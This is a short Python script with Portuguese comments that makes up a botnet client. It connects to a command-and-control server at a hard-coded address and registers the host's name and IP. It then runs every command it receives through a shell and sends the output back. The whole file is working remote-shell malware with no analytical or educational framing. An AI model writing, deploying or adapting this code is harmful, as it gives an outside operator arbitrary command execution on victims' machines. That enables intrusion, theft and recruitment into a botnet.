import socket
import subprocess
import time

def register_and_connect():
    server_ip = "192.168.100.74"  # Substituir pelo IP do servidor C2
    port = 9999
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, port))
        
        # Registra o bot com IP local
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        sock.send(f"REGISTER {local_ip}".encode())
        
        while True:
            data = sock.recv(1024).decode('utf-8')
            if not data: break
            
            if data == "PING":
                sock.send(b"PONG")
            else:
                result = subprocess.run(data, shell=True, 
                                      capture_output=True, text=True)
                sock.send(result.stdout.encode())
                
    except Exception as e:
        print(f"Erro: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    register_and_connect()
